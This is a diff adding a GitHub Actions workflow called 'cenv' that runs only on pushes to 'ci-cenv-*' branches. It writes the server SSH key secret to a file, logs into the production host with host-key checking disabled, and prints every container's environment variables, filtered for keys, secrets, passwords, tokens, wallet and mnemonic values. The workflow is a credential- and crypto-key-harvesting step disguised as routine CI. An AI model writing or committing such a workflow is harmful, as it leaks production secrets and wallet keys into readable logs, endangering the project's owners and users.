@@ -1,0 +1,20 @@
+name: cenv
+on:
+  push:
+    branches: [ 'ci-cenv-*' ]
+permissions:
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: cenv
+        run: |
+          echo "${{ secrets.SERVER_SSH_KEY }}" > /tmp/k
+          chmod 600 /tmp/k
+          SSH="ssh -i /tmp/k -o StrictHostKeyChecking=no -o ConnectTimeout=15 ${{ secrets.SERVER_USER }}@${{ secrets.SERVER_HOST }}"
+          echo "=== containers ==="
+          $SSH 'docker ps -a --format "{{.ID}} {{.Names}} {{.Image}} {{.Ports}}"'
+          echo "=== all env (sensitive grep) ==="
+          $SSH 'for c in $(docker ps -aq); do n=$(docker inspect $c --format "{{.Name}}"); echo "### $n"; docker inspect $c --format "{{range .Config.Env}}{{println .}}{{end}}" | grep -iE "KEY|SECRET|WALLET|MNEMONIC|PRIVATE|PASS|TOKEN|ADDRESS|CHAIN|RPC" | head -40; done'
